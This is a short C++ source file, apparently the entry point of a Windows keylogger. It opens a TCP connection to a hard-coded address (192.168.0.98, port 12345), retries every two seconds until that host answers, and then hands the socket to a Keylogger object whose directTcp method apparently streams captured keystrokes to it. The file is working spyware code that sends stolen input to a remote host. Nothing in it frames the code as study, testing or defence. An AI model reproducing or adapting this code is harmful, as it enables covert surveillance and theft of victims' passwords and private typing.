
#include "../inc/Keylogger.h"

using namespace std ;

SOCKET openConn()
{

    WSADATA WSAData; 
    
    SOCKADDR_IN address_client;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    SOCKET sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr("192.168.0.98");
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(12345);

    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(2000);
        //Whait...;  
    } 
    return sock_client;
}

int main()
{
    
    SOCKET sock = openConn();

    wcout << "connected !" << endl;

    Keylogger keylogg(sock);

    keylogg.directTcp();

    return 0;
}